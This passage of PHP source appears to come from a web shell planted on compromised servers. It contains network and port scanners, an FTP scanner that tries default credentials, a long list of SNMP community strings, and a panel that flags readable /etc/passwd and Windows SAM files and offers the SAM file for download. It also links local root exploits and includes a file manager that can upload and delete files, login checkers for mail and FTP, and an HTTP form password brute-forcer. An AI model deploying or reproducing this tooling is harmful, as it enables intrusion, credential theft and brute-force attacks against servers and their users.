$ftp=ftp_connect($ip,21,$timeout);
if($ftp){
if(ftp_login($ftp,$user,$pass)){$output=1;echo "$ip) FTP FOUND: ($user:$pass) System type: ".ftp_systype($ftp)." (<b><a href='";echo hlinK("seC=ftpc&workingdiR=".getcwd()."&hosT=$ip&useR=$user&pasS=$pass");echo "' target='_blank'>Connect</a></b>)<br>";}
}
}
}
}
if($output)echo '<hr size=1 noshade>';
}
$time=time()-$start;
echo "Done! ($time seconds)</font>";
if(!empty($buglist))unlink($buglist);
}
elseif(!empty($_REQUEST['directoryscanner'])){
$dir=file($_REQUEST['dic']);$host=$_REQUEST['host'];$r=$_REQUEST['r1'];
echo "<font color=blue><pre>Scanning started...\n";
for($i=0;$i<count($dir);$i++){
$d=trim($dir[$i]);
if($r){
$adr="http://$host/$d/";
if(check_urL($adr,'GET','302')){echo "Directory Found: <a href='$adr' target='_blank'>$adr</a>\n";}
}else{
$adr="$d.$host";
$ip=gethostbyname($adr);
if($ip!=$adr){echo "Subdomain Found: <a href='http://$adr' target='_blank'>$adr($ip)</a>\n";}
}
}
echo 'Done!</pre></font>';
}
else{
$t="<br><table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='50%'><tr><form method='POST'";
$chbox=(extension_loaded('sockets'))?"<input type=checkbox style='border-width:1px;background-color:#808080;' name=tcp value=1 checked>TCP<input type=checkbox name=udp style='border-width:1px;background-color:#808080;' value=1 checked>UDP":"<input type=hidden name=tcp value=1>";
echo "<center>$t><td>Port scanner:</td></tr><td width='25%' bgcolor='#808080'>Target:</td><td bgcolor='#808080' width=80%><input name=target value=$host size=40></td></tr><tr><td bgcolor='#666666' width=25%>From:</td><td bgcolor='#666666' width=25%><input name=fromport type=text value='1' size=5></td></tr><tr><td bgcolor='#808080' width=25%>To:</td><td bgcolor='#808080' width=25%><input name=toport type=text value='1024' size=5></td></tr><tr><td width='25%' bgcolor='#666666'>Timeout:</td><td bgcolor='#666666'><input name=timeout type=text value='2' size=5></td><tr><td width='25%' bgcolor='#808080'>$chbox</td><td bgcolor='#808080' align='right'>$hcwd<input type=submit class=buttons name=portscanner value=Scan></form>$et$t><td>Discoverer:</td></tr><tr><td width='25%' bgcolor='#808080'>Host:</td><td bgcolor='#808080' width=80%><input name=host value='".$_SERVER["HTTP_HOST"]."' size=40></td><td bgcolor='#808080'></td></tr><tr><td width='25%' bgcolor='#666666'>Dictionary:</td><td bgcolor='#666666' width=80%><input name=dic size=40></td><td bgcolor='#666666'></td></tr><tr><td width='25%' bgcolor='#808080'>Search for:</td><td bgcolor='#808080' width=40%><input type=radio value=1 checked name=r1>Directories<input type=radio name=r1 value=0>Subdomains</td><td bgcolor='#808080' align='right' width=40%><input type=submit class=buttons name=directoryscanner value=Scan></td></form></tr></table>";
$host=substr($host,0,strrpos($host,"."));
echo "$t name=security><td>Security scanner:</td></tr><td width='25%' bgcolor='#808080'>From:</td><td bgcolor='#808080' width=80%><input name=from value=$host.1 size=40> <input type=checkbox value=1 style='border-width:1px;background-color:#808080;' name=nslookup checked>NS lookup</td></tr><tr><td bgcolor='#666666' width=25%>To:</td><td bgcolor='#666666' width=25%>xxx.xxx.xxx.<input name=to type=text value=254 size=4>$hcwd</td></tr><tr><td width='25%' bgcolor='#808080'>Timeout:</td><td bgcolor='#808080'><input name=timeout type=text value='2' size=5></td></tr><tr><td width='25%' bgcolor='#666666'><input type=checkbox name=ipscanner value=1 checked onClick='document.security.port.disabled = !document.security.port.disabled;' style='border-width:1px;background-color:#666666;'>Port scanner:</td><td bgcolor='#666666'><input name=port type=text value='21,23,25,80,110,135,139,143,443,445,1433,3306,3389,8080,65301' size=60></td></tr><tr><td width='25%' bgcolor='#808080'><input type=checkbox name=httpbanner value=1 checked style='border-width:1px;background-color:#808080;'>Get web banner</td><td bgcolor='#808080'><input type=checkbox name=httpscanner value=1 checked style='border-width:1px;background-color:#808080;'>Webserver security scanning&nbsp;&nbsp;&nbsp;<input type=checkbox name=smtprelay value=1 checked style='border-width:1px;background-color:#808080;'>SMTP relay check</td></tr><tr><td width='25%' bgcolor='#666666'><input type=checkbox name=ftpscanner value=1 checked onClick='document.security.userpass.disabled = !document.security.userpass.disabled;' style='border-width:1px;background-color:#666666;'>FTP password:</td><td bgcolor='#666666'><input name=userpass type=text value='anonymous:admin@nasa.gov,ftp:ftp,Administrator:[BLANK],guest:[BLANK]' size=60></td></tr><tr><td width='25%' bgcolor='#808080'><input type=checkbox name=snmpscanner value=1 onClick='document.security.com.disabled = !document.security.com.disabled;' checked style='border-width:1px;background-color:#808080;'>SNMP:</td><td bgcolor='#808080'><input name=com type=text value='public,private,secret,cisco,write,test,guest,ilmi,ILMI,password,all private,admin,all,system,monitor,sun,agent,manager,ibm,hello,switch,solaris,OrigEquipMfr,default,world,tech,mngt,tivoli,openview,community,snmp,SNMP,none,snmpd,Secret C0de,netman,security,pass,passwd,root,access,rmon,rmon_admin,hp_admin,NoGaH$@!,router,agent_steal,freekevin,read,read-only,read-write,0392a0,cable-docsis,fubar,ANYCOM,Cisco router,xyzzy,c,cc,cascade,yellow,blue,internal,comcomcom,IBM,apc,TENmanUFactOryPOWER,proxy,core,CISCO,regional,1234,2read,4changes' size=60></td></tr><tr><td width='25%' bgcolor='#666666'></td><td bgcolor='#666666' align='right'><input type=submit class=buttons name=securityscanner value=Scan></form>$et";
}
}
function sysinfO(){
global $windows,$disablefunctions,$cwd,$safemode;
$t8="<td width='25%' bgcolor='#808080'>";
$t6="<td width='25%' bgcolor='#666666'>";
$mil="<a target='_blank' href='http://www.milw0rm.org/related.php?program=";
$basedir=(ini_get('open_basedir') || strtoupper(ini_get('open_basedir'))=='ON')?'ON':'OFF';
if(!empty($_SERVER['PROCESSOR_IDENTIFIER']))$CPU=$_SERVER['PROCESSOR_IDENTIFIER'];
$osver=$tsize=$fsize='';
$ds=implode(' ',$disablefunctions);
if($windows){
$osver='  ('.shelL('ver').')';
$sysroot=shelL("echo %systemroot%");
if(empty($sysroot))$sysroot=$_SERVER['SystemRoot'];
if(empty($sysroot))$sysroot = getenv('windir');
if(empty($sysroot))$sysroot = 'Not Found';
if(empty($CPU))$CPU=shelL('echo %PROCESSOR_IDENTIFIER%');
for($i=66;$i<=90;$i++){
$drive=chr($i).':\\';
if(is_dir($drive)){
$fsize+=disk_free_space($drive);
$tsize+=disk_total_space($drive);
}
}
}else{
$ap=shelL('whereis apache');
if(!$ap)$ap='Unknow';
$fsize=disk_free_space('/');
$tsize=disk_total_space('/');
}
$xpl=rootxpL();if(!$xpl)$xpl='Not found.';
$disksize='Used spase: '.showsizE($tsize-$fsize).' Free space: '.showsizE($fsize).' Total space: '.showsizE($tsize);
if(empty($CPU))$CPU='Unknow';
$os=php_uname();
$osn=php_uname('s');
if(!$windows){
$ker=php_uname('r');
$o=($osn=='Linux')?'Linux+Kernel':$osn;
$os=str_replace($osn,"${mil}$o'>$osn</a>",$os);
$os=str_replace($ker,"${mil}Linux+Kernel'>$ker</a>",$os);
$inpa=':';
}else{
$sam=$sysroot."\\system32\\config\\SAM";
$inpa=';';
$os=str_replace($osn,"${mil}MS+Windows'>$osn</a>",$os);
}
$cuser=get_current_user();
if(!$cuser)$cuser='Unknow';
$software=str_replace('Apache',"${mil}Apache'>Apache</a>",$_SERVER['SERVER_SOFTWARE']);
echo "<table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='100%'><tr><td>Server information:</td></tr><tr>${t6}Server:</td><td bgcolor='#666666'>".$_SERVER['HTTP_HOST'];if(!empty($_SERVER["SERVER_ADDR"])){ echo "(". $_SERVER["SERVER_ADDR"] .")";}echo "</td></tr><tr>${t8}Operation system:</td><td bgcolor='#808080'>$os$osver</td></tr><tr>${t6}Web server application:</td><td bgcolor='#666666'>$software</td></tr><tr>${t8}CPU:</td><td bgcolor='#808080'>$CPU</td></tr>${t6}Disk status:</td><td bgcolor='#666666'>$disksize</td></tr><tr>${t8}User domain:</td><td bgcolor='#808080'>";if (!empty($_SERVER['USERDOMAIN'])) echo $_SERVER['USERDOMAIN'];else echo "Unknow"; echo "</td></tr><tr>${t6}User name:</td><td bgcolor='#666666'>$cuser</td></tr>";
if($windows){
echo "<tr>${t8}Windows directory:</td><td bgcolor='#808080'><a href='".hlinK("seC=fm&workingdiR=$sysroot")."'>$sysroot</a></td></tr><tr>${t6}Sam file:</td><td bgcolor='#666666'>";if(is_readable(($sam)))echo "<a href='".hlinK("?workingdiR=$sysroot\\system32\\config&downloaD=sam")."'>Readable</a>"; else echo 'Not readable';echo '</td></tr>';
}
else
{
echo "<tr>${t8}UID - GID:</td><td bgcolor='#808080'>".getmyuid().' - '.getmygid()."</td></tr><tr>${t6}Recommended local root exploits:</td><td bgcolor='#666666'>$xpl</td></tr><tr>${t8}Passwd file:</td><td bgcolor='#808080'>";
if(is_readable('/etc/passwd'))echo "<a href='".hlinK("seC=edit&filE=/etc/passwd&workingdiR=$cwd")."'>Readable</a>";else echo'Not readable';echo "</td></tr><tr>${t6}${mil}cpanel'>cPanel</a>:</td><td bgcolor='#666666'>";$cp='/usr/local/cpanel/version';$cv=(file_exists($cp) && is_writable($cp))?trim(file_get_contents($cp)):'Unknow';echo "$cv (Log file: ";
if(file_exists('/var/cpanel/accounting.log')){if(is_readable('/var/cpanel/accounting.log'))echo "<a href='".hlinK("seC=edit&filE=/var/cpanel/accounting.log&workingdiR=$cwd")."'>Readable</a>";else echo 'Not readable';}else echo 'Not found';echo ')</td></tr>';
}
echo "<tr>$t8${mil}PHP'>PHP</a> version:</td><td bgcolor='#808080'><a href='?=".php_logo_guid()."' target='_blank'>".PHP_VERSION."</a> (<a href='".hlinK("seC=phpinfo&workingdiR=$cwd")."'>more...</a>)</td></tr><tr>${t6}Zend version:</td><td bgcolor='#666666'>";if (function_exists('zend_version')) echo "<a href='?=".zend_logo_guid()."' target='_blank'>".zend_version().'</a>';else echo 'Not Found';echo "</td><tr>${t8}Include path:</td><td bgcolor='#808080'>".str_replace($inpa,' ',DEFAULT_INCLUDE_PATH)."</td><tr>${t6}PHP Modules:</td><td bgcolor='#666666'>";$ext=get_loaded_extensions();foreach($ext as $v){$i=phpversion($v);if(!empty($i))$i="($i)";$l=hlinK("exT=$v");echo "<a href='javascript:void(0)' onclick=\"window.open('$l','','width=300,height=200,scrollbars=yes')\">$v</a> $i ";}echo "</td><tr>${t8}Disabled functions:</td><td bgcolor='#808080'>";if(!empty($ds))echo "$ds ";else echo 'Nothing'; echo"</td></tr><tr>${t6}Safe mode:</td><td bgcolor='#666666'>$safemode</td></tr><tr>${t8}Open base dir:</td><td bgcolor='#808080'>$basedir</td></tr><tr>${t6}DBMS:</td><td bgcolor='#666666'>";$sq='';if(function_exists('mysql_connect')) $sq= "${mil}MySQL'>MySQL</a> ";if(function_exists('mssql_connect')) $sq.= " ${mil}MSSQL'>MSSQL</a> ";if(function_exists('ora_logon')) $sq.= " ${mil}Oracle'>Oracle</a> ";if(function_exists('sqlite_open')) $sq.= ' SQLite ';if(function_exists('pg_connect')) $sq.= " ${mil}PostgreSQL'>PostgreSQL</a> ";if(function_exists('msql_connect')) $sq.= ' mSQL ';if(function_exists('mysqli_connect'))$sq.= ' MySQLi ';if(function_exists('ovrimos_connect')) $sq.= ' Ovrimos SQL ';if ($sq=='') $sq= 'Nothing'; echo "$sq</td></tr></table>";
}
function checksuM($file){
global $et;
echo "<table border=0 style='border-collapse: collapse' width='100%'><tr><td width='10%' bgcolor='#666666'><b>MD5:</b> <font color=#F0F0F0>".md5_file($file).'</font><br><b>SHA1:</b><font color=#F0F0F0>'.sha1_file($file)."</font>$et";
}
function listdiR($cwd,$task){
$c=getcwd();
$dh=opendir($cwd);
while($cont=readdir($dh)){
if($cont=='.' || $cont=='..')continue;
$adr=$cwd.DIRECTORY_SEPARATOR.$cont;
switch($task){
case '0':if(is_file($adr))echo "[<a href='".hlinK("seC=edit&filE=$adr&workingdiR=$c")."'>$adr</a>]\n";if(is_dir($adr))echo "[<a href='".hlinK("seC=fm&workingdiR=$adr")."'>$adr</a>]\n";break;
case '1':if(is_writeable($adr)){if(is_file($adr))echo "[<a href='".hlinK("seC=edit&filE=$adr&workingdiR=$c")."'>$adr</a>]\n";if(is_dir($adr))echo "[<a href='".hlinK("seC=fm&workingdiR=$adr")."'>$adr</a>]\n";}break;
case '2':if(is_file($adr) &&  is_writeable($adr))echo "[<a href='".hlinK("seC=edit&filE=$adr&workingdiR=$c")."'>$adr</a>]\n";break;
case '3':if(is_dir($adr) && is_writeable($adr))echo "[<a href='".hlinK("seC=fm&workingdiR=$adr")."'>$adr</a>]\n";break;
case '4':if(is_file($adr))echo "[<a href='".hlinK("seC=edit&filE=$adr&workingdiR=$c")."'>$adr</a>]\n";break;
case '5':if(is_dir($adr))echo "[<a href='".hlinK("seC=fm&workingdiR=$adr")."'>$adr</a>]\n";break;
case '6':if(preg_match('@'.$_REQUEST['search'].'@',$cont) || (is_file($adr) && preg_match('@'.$_REQUEST['search'].'@',file_get_contents($adr)))){if(is_file($adr))echo "[<a href='".hlinK("seC=edit&filE=$adr&workingdiR=$c")."'>$adr</a>]\n";if(is_dir($adr))echo "[<a href='".hlinK("seC=fm&workingdiR=$adr")."'>$adr</a>]\n";}break;
case '7':if(strstr($cont,$_REQUEST['search']) || (is_file($adr) && strstr(file_get_contents($adr),$_REQUEST['search']))){if(is_file($adr))echo "[<a href='".hlinK("seC=edit&filE=$adr&workingdiR=$c")."'>$adr</a>]\n";if(is_dir($adr))echo "[<a href='".hlinK("seC=fm&workingdiR=$adr")."'>$adr</a>]\n";}break;
case '8':{if(is_dir($adr))rmdir($adr);else unlink($adr);rmdir($cwd);break;}
}
if(is_dir($adr))listdiR($adr,$task);
}
}
if(!checkfunctioN('posix_getpwuid')){function posix_getpwuid($u){return 0;}}
if(!checkfunctioN('posix_getgrgid')){function posix_getgrgid($g){return 0;}}
function filemanageR(){
global $windows,$msgbox,$errorbox,$t,$et,$cwd,$hcwd;
$table="<table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='100%'>";
$td1n="<td width='22%' bgcolor='#666666'>";
$td2m="<td width='22%' bgcolor='#808080'>";
$td1i="<td width='5%' bgcolor='#666666'>";
$td2i="<td width='5%' bgcolor='#808080'>";
$tdnr="<td width='22%' bgcolor='#800000'>";
$tdw="<td width='22%' bgcolor='#006E00'>";
if(!empty($_REQUEST['task'])){
if(!empty($_REQUEST['search']))$_REQUEST['task']=7;
if(!empty($_REQUEST['re']))$_REQUEST['task']=6;
echo '<font color=blue><pre>';
listdiR($cwd,$_REQUEST['task']);
echo '</pre></font>';
}else{
if(!empty($_REQUEST['cP']) || !empty($_REQUEST['mV']) || !empty($_REQUEST['rN'])){
if(!empty($_REQUEST['cP']) || !empty($_REQUEST['mV'])){
$title='Destination';
$ad=(!empty($_REQUEST['cP']))?$_REQUEST['cP']:$_REQUEST['mV'];
$dis=(!empty($_REQUEST['cP']))?'Copy':'Move';
}else{
$ad=$_REQUEST['rN'];
$title='New name';
$dis='Rename';
}
if(!!empty($_REQUEST['deS'])){
echo "<center><table border=0 style='border-collapse: collapse' width='40%'><tr><td width='100%' bgcolor='#333333'>$title:</td></tr><tr>$td1n<form method='POST'><input type=text value='";if(empty($_REQUEST['rN']))echo $cwd;echo "' size=60 name=deS></td></tr><tr>$td2m$hcwd<input type=hidden value='".htmlspecialchars($ad)."' name=cp><input class=buttons type=submit value=$dis></form>$et</center>";
}else{
if(!empty($_REQUEST['rN']))rename($ad,$_REQUEST['deS']);
else{
copy($ad,$_REQUEST['deS']);
if(!empty($_REQUEST['mV']))unlink($ad);
}
}
}
if(!empty($_REQUEST['deL'])){if(is_dir($_REQUEST['deL']))listdiR($_REQUEST['deL'],8);else unlink($_REQUEST['deL']);}
if(!empty($_FILES['uploadfile'])){
move_uploaded_file($_FILES['uploadfile']['tmp_name'],$_FILES['uploadfile']['name']);
echo "$msgbox<b>Uploaded!</b> File name: ".$_FILES['uploadfile']['name']." File size: ".$_FILES['uploadfile']['size']. "$et<br>";
}
$select="<select onChange='document.location=this.options[this.selectedIndex].value;'><option value='".hlinK("seC=fm&workingdiR=$cwd")."'>--------</option><option value='";
if(!empty($_REQUEST['newf'])){
if(!empty($_REQUEST['newfile'])){file_put_contents($_REQUEST['newf'],'');}
if(!empty($_REQUEST['newdir'])){mkdir($_REQUEST['newf']);}
}
if($windows){
echo "$table<td><b>Drives:</b> ";
for($i=66;$i<=90;$i++){$drive=chr($i).':';
if(is_dir($drive."\\")){$vol=shelL("vol $drive");if(empty($vol))$vol=$drive;echo " <a title='$vol' href=".hlinK("seC=fm&workingdiR=$drive\\").">$drive\\</a>";}
}
echo $et;
}
echo "$table<form method='POST'><tr><td width='20%'><b>[ <a id='lk' style='text-decoration:none' href='#' onClick=\"HS('div');\">-</a> ] Location:</b><input type=text name=workingdiR size=135 value='$cwd'><input class=buttons type=submit value=Change></form>$et";
$file=$dir=$link=array();
if($dirhandle=opendir($cwd)){
while($cont=readdir($dirhandle)){
if(is_dir($cwd.DIRECTORY_SEPARATOR.$cont))$dir[]=$cont;
elseif(is_file($cwd.DIRECTORY_SEPARATOR.$cont))$file[]=$cont;
else $link[]=$cont;
}
closedir($dirhandle);
sort($file);sort($dir);sort($link);
echo "<div id='div'><table border=1 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bordercolor='#282828' bgcolor='#333333' width='100%'><tr><td width='30%' bgcolor='#333333' align='center'>Name</td><td width='13%' bgcolor='#333333' align='center'>Owner</td><td width='12%' bgcolor='#333333' align='center'>Modification time</td><td width='12%' bgcolor='#333333' align='center'>Last change</td><td width='5%' bgcolor='#333333' align='center'>Info</td><td width='7%' bgcolor='#333333' align='center'>Size</td><td width='15%' bgcolor='#333333' align='center'>Actions</td></tr>";
$i=0;
foreach($dir as $dn){
echo '<tr>';
$i++;
$own='Unknow';
$owner=posix_getpwuid(fileowner($dn));
$mdate=date('Y/m/d H:i:s',filemtime($dn));
$adate=date('Y/m/d H:i:s',fileatime($dn));
$diraction=$select.hlinK('seC=fm&workingdiR='.realpath($dn))."'>Open</option><option value='".hlinK("seC=fm&workingdiR=$cwd&rN=$dn")."'>Rename</option><option value='".hlinK("seC=fm&deL=$dn&workingdiR=$cwd")."'>Remove</option></select></td>";
if($owner)$own="<a title=' Shell: ".$owner['shell']."' href='".hlinK('seC=fm&workingdiR='.$owner['dir'])."'>".$owner['name'].'</a>';
if(($i%2)==0){$cl1=$td1i;$cl2=$td1n;}else{$cl1=$td2i;$cl2=$td2m;}
if(is_writeable($dn))echo $tdw;elseif(!is_readable($dn))echo $tdnr;else echo $cl2;
echo "<a href='".hlinK('seC=fm&workingdiR='.realpath($dn))."'>";
if(strlen($dn)>45)echo substr($dn,0,42).'...';else echo $dn;echo '</a>';
echo $cl1."$own</td>";
echo $cl1."$mdate</td>";
echo $cl1."$adate</td>";
echo "</td>$cl1";echo "<a href='#' onClick=\"javascript:chmoD('$dn')\" title='Change mode'>";echo 'D';if(is_readable($dn))echo 'R';if(is_writeable($dn))echo 'W';echo '</a></td>';
echo "$cl1------</td>";
echo $cl2.$diraction;
echo '</tr>';
}
foreach($file as $fn){
echo '<tr>';
$i++;
$own='Unknow';
$owner=posix_getpwuid(fileowner($fn));
$fileaction=$select.hlinK("seC=openit&namE=$fn&workingdiR=$cwd")."'>Open</option><option value='".hlinK("seC=edit&filE=$fn&workingdiR=$cwd")."'>Edit</option><option value='".hlinK("seC=fm&downloaD=$fn&workingdiR=$cwd")."'>Download</option><option value='".hlinK("seC=hex&filE=$fn&workingdiR=$cwd")."'>Hex view</option><option value='".hlinK("seC=img&filE=$fn&workingdiR=$cwd")."'>Image</option><option value='".hlinK("seC=inc&filE=$fn&workingdiR=$cwd")."'>Include</option><option value='".hlinK("seC=checksum&filE=$fn&workingdiR=$cwd")."'>Checksum</option><option value='".hlinK("seC=fm&workingdiR=$cwd&cP=$fn")."'>Copy</option><option value='".hlinK("seC=fm&workingdiR=$cwd&mV=$fn")."'>Move</option><option value='".hlinK("seC=fm&deL=$fn&workingdiR=$cwd")."'>Remove</option></select></td>";
$mdate=date('Y/m/d H:i:s',filemtime($fn));
$adate=date('Y/m/d H:i:s',fileatime($fn));
if($owner)$own="<a title='Shell:".$owner['shell']."' href='".hlinK('seC=fm&workingdiR='.$owner['dir'])."'>".$owner['name'].'</a>';
$size=showsizE(filesize($fn));
if(($i%2)==0){$cl1=$td1i;$cl2=$td1n;}else{$cl1=$td2i;$cl2=$td2m;}
if(is_writeable($fn))echo $tdw;elseif(!is_readable($fn))echo $tdnr;else echo $cl2;
echo "<a href='".hlinK("seC=openit&namE=$fn&workingdiR=$cwd")."'>";
if(strlen($fn)>45)echo substr($fn,0,42).'...';else echo $fn;echo '</a>';
echo $cl1."$own</td>";
echo $cl1."$mdate</td>";
echo $cl1."$adate</td>";
echo "</td>$cl1";echo "<a href='#' onClick=\"javascript:chmoD('$fn')\" title='Change mode'>";if(is_readable($fn))echo "R";if(is_writeable($fn))echo "W";if(is_executable($fn))echo "X";if(is_uploaded_file($fn))echo "U";echo "</a></td>";
echo "$cl1$size</td>";
echo $cl2.$fileaction;
echo '</tr>';
}
foreach($link as $ln){
$own='Unknow';
$i++;
$owner=posix_getpwuid(fileowner($ln));
$linkaction=$select.hlinK("seC=openit&namE=$ln&workingdiR=$ln")."'>Open</option><option value='".hlinK("seC=edit&filE=$ln&workingdiR=$cwd")."'>Edit</option><option value='".hlinK("seC=fm&downloaD=$ln&workingdiR=$cwd")."'>Download</option><option value='".hlinK("seC=hex&filE=$ln&workingdiR=$cwd")."'>Hex view</option><option value='".hlinK("seC=img&filE=$ln&workingdiR=$cwd")."'>Image</option><option value='".hlinK("seC=inc&filE=$ln&workingdiR=$cwd")."'>Include</option><option value='".hlinK("seC=checksum&filE=$ln&workingdiR=$cwd")."'>Checksum</option><option value='".hlinK("seC=fm&workingdiR=$cwd&cP=$ln")."'>Copy</option><option value='".hlinK("seC=fm&workingdiR=$cwd&mV=$ln")."'>Move</option><option value='".hlinK("seC=fm&workingdiR=$cwd&rN=$ln")."'>Rename</option><option value='".hlinK("seC=fm&deL=$ln&workingdiR=$cwd")."'>Remove</option></select></td>";
$mdate=date('Y/m/d H:i:s',filemtime($ln));
$adate=date('Y/m/d H:i:s',fileatime($ln));
if($owner)$own="<a title='Shell: ".$owner['shell']."' href='".hlinK('seC=fm&workingdiR='.$owner['dir'])."'>".$owner['name'].'</a>';
echo '<tr>';
$size=showsizE(filesize($ln));
if(($i%2)==0){$cl1=$td1i;$cl2=$td1n;}else{$cl1=$td2i;$cl2=$td2m;}
if(is_writeable($ln))echo $tdw;elseif(!is_readable($ln))echo $tdnr;else echo $cl2;
echo "<a href='".hlinK("seC=openit&namE=$ln&workingdiR=$cwd")."'>";
if(strlen($ln)>45)echo substr($ln,0,42).'...';else echo $ln;echo '</a>';
echo $cl1."$own</td>";
echo $cl1."$mdate</td>";
echo $cl1."$adate</td>";
echo "</td>${cl1}";echo "<a href='#' onClick=\"javascript:chmoD('$ln')\" title='Change mode'>L";if(is_readable($ln))echo "R";if (is_writeable($ln))echo "W";if(is_executable($ln))echo "X";echo "</a></td>";
echo "$cl1$size</td>";
echo $cl2.$linkaction;
echo '</tr>';
}
}
$dc=count($dir)-2;
if($dc==-2)$dc=0;
$fc=count($file);
$lc=count($link);
$total=$dc+$fc+$lc;
$min=min(substr(ini_get('upload_max_filesize'),0,strpos(ini_get('post_max_size'),'M')),substr(ini_get('post_max_size'),0,strpos(ini_get('post_max_size'),'M'))).' MB';
echo "</table></div>$table<tr><td><form method=POST>Find:<input type=text value=\$pass name=search><input type=checkbox name=re value=1 style='border-width:1px;background-color:#333333;'>Regular expressions <input type=submit class=buttons value=Find>$hcwd<input type=hidden value=7 name=task></form></td><td><form method=POST>$hcwd<input type=hidden value='fm' name=seC><select name=task><option value=0>Display files and directories in current folder</option><option value=1>Find writable files and directories in current folder</option><option value=2>Find writable files in current folder</option><option value=3>Find writable directories in current folder</option><option value=4>Display all files in current folder</option><option value=5>Display all directories in current folder</option></select><input type=submit class=buttons value=Do></form>$et</tr></table><table width='100%'><tr><td width='50%'><br><table bgcolor=#333333 border=0 width='65%'><td><b>Summery:</b>   Total: $total Directories: $dc Files: $fc Links: $lc$et<table bgcolor=#333333 border=0 width='65%'><td width='100%' bgcolor=";if (is_writeable($cwd)) echo '#006E00';elseif (!is_readable($cwd)) echo '#800000';else '#333333'; echo '>Current directory status: ';if (is_readable($cwd)) echo 'R';if (is_writeable($cwd)) echo 'W' ;echo "$et<table border=0 style='border-collapse: collapse' width='65%'><tr><td width='100%' bgcolor='#333333'>New:</td></tr><tr>$td1n<form method='POST'><input type=text size=47 name=newf></td></tr><tr>$td2m$hcwd<input class=buttons type=submit name=newfile value='File'><input class=buttons type=submit name=newdir value='Folder'></form>$et</td><td width='50%'><br>${t}Upload:</td></tr><tr>$td1n<form method='POST' enctype='multipart/form-data'><input type=file size=45 name=uploadfile></td></tr><tr>$td2m$hcwd<input class=buttons type=submit value=Upload></td></tr>$td1n Note: Max allowed file size to upload on this server is $min</form>$et$et";
}
}
function imapchecK($host,$username,$password,$timeout){
$sock=fsockopen($host,143,$n,$s,$timeout);
$b=uniqid('NJ');
$l=strlen($b);
if(!$sock)return -1;
fread($sock,1024);
fputs($sock,"$b LOGIN $username $password\r\n");
$res=fgets($sock,$l+4);
fclose($sock);
if($res=="$b OK")return 1;else return 0;
}
function ftpchecK($host,$username,$password,$timeout){
$ftp=ftp_connect($host,21,$timeout);
if(!$ftp)return -1;
$con=ftp_login($ftp,$username,$password);
if($con)return 1;else return 0;
}
function pop3checK($server,$user,$pass,$timeout){
$sock=fsockopen($server,110,$en,$es,$timeout);
if(!$sock)return -1;
fread($sock,1024);
fwrite($sock,"user $user\n");
$r=fgets($sock);
if($r{0}=='-')return 0;
fwrite($sock,"pass $pass\n");
$r=fgets($sock);
fclose($sock);
if($r{0}=='+')return 1;
return 0;
}
function formcrackeR(){
global $errorbox,$footer,$et,$hcwd;
if(!empty($_REQUEST['start'])){
if(isset($_REQUEST['loG'])&& !empty($_REQUEST['logfilE'])){$log=1;$file=$_REQUEST['logfilE'];}else $log=0;
$url=$_REQUEST['target'];
$uf=$_REQUEST['userf'];
$pf=$_REQUEST['passf'];
$sf=$_REQUEST['submitf'];
$sv=$_REQUEST['submitv'];
$method=$_REQUEST['method'];
$fail=$_REQUEST['fail'];
$dic=$_REQUEST['dictionary'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:'';
if(!file_exists($dic))die("$errorbox Can not open dictionary.$et$footer");
$dictionary=fopen($dic,'r');
echo '<font color=blue>Cracking started...<br>';
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$url.="?$uf=$user&$pf=$pass&$sf=$sv";
$res=check_urL($url,$method,$fail,12);
if(!$res){echo "<font color=blue>U: $user P: $pass</font><br>";if($log)file_add_contentS($file,"U: $user P: $pass\r\n");if(!$type)break;}
}
fclose($dictionary);
echo 'Done!</font><br>';
}
else echo "<center><table border=0 style='border-collapse: collapse' width='434'><tr><td width='174' bgcolor='#333333'>HTTP Form cracker:</td><td bgcolor='#333333' width='253'></td></tr><form method='POST' name=form><tr><td width='174' bgcolor='#666666'>Dictionary:</td><td bgcolor='#666666' width='253'><input type=text name=dictionary size=35></td></tr><tr><td width='174' bgcolor='#808080'>Dictionary type:</td><td bgcolor='#808080'><input type=radio name=combo checked value=0 onClick='document.form.user.disabled = false;' style='border-width:1px;background-color:#808080;'>Simple (P)<input type=radio value=1 name=combo onClick='document.form.user.disabled = true;' style='border-width:1px;background-color:#808080;'>Combo (U:P)</td></tr><tr><td width='174' bgcolor='#666666'>Username:</td><td bgcolor='#666666'><input type=text size=35 value=root name=user>$hcwd</td></tr><tr><td width='174' bgcolor='#808080'>Action Page:</td><td bgcolor='#808080' width='253'><input type=text name=target value='http://".getenv('HTTP_HOST')."/login.php' size=35></td></tr><tr><td width='174' bgcolor='#666666'>Method:</td><td bgcolor='#666666' width='253'><select size='1' name='method'><option selected value='POST'>POST</option><option value='GET'>GET</option></select></td></tr><tr><td width='174' bgcolor='#808080'>Username field name:</td><td bgcolor='#808080' width='253'><input type=text name=userf value=user size=35></td></tr><tr><td width='174' bgcolor='#666666'>Password field name:</td><td bgcolor='#666666' width='253'><input type=text name=passf value=passwd size=35></td></tr><tr><td width='174' bgcolor='#808080'>Submit name:</td><td bgcolor='#808080' width='253'><input type=text value=login name=submitf size=35></td></tr><tr><td width='174' bgcolor='#666666'>Submit value:</td><td bgcolor='#666666' width='253'><input type=text value='Login' name=submitv size=35></td></tr><tr><td width='174' bgcolor='#808080'>Fail string:</td><td bgcolor='#808080' width='253'><input type=text name=fail value='Try again' size=35></td></tr><tr><td width='174' bgcolor='#666666'><input type=checkbox name=loG value=1 onClick='document.form.logfilE.disabled = !document.form.logfilE.disabled;' style='border-width:1px;background-color:#666666;' checked>Log</td><td bgcolor='#666666'><input type=text name=logfilE size=25 value='".whereistmP().DIRECTORY_SEPARATOR.".log'> <input class=buttons type=submit name=start value=Start></form>$et</center>";
}
function hashcrackeR(){
global $errorbox,$t,$et,$hcwd;
if(!empty($_REQUEST['hash']) && !empty($_REQUEST['dictionary']) && !empty($_REQUEST['type'])){
if(isset($_REQUEST['loG'])&& !empty($_REQUEST['logfilE'])){$log=1;$file=$_REQUEST['logfilE'];}else $log=0;
$dictionary=fopen($_REQUEST['dictionary'],'r');
